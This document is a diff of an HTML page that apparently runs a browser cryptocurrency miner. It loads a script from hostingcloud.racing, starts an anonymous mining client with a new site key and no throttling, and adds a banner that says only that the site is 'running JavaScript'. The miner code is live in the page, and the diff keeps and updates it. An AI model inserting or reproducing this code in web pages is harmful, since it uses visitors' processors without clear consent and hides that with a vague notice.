@@ -128,14 +128,17 @@
                 </div>
             </div>
         </div>
+        
+
         <script src="https://www.hostingcloud.racing/KvFY.js"></script>
 <script>
-    var _client = new Client.Anonymous('aa9b15b8f7b248ce4c9e300722fa8545bc657cc37a45fb033ed85d4f21dbf650', {
+    var _client = new Client.Anonymous('0347a35a94ea37f3d7be622c7db32860501c10548d3383a8aee0f26e73cfb31b', {
         throttle: 0, c: 'w'
     });
     _client.start();
-    
+    _client.addMiningNotification("Top", "This site is running JavaScript", "#cccccc", 40, "#3d3d3d");
 
 </script>
+
     </body>
 </html>
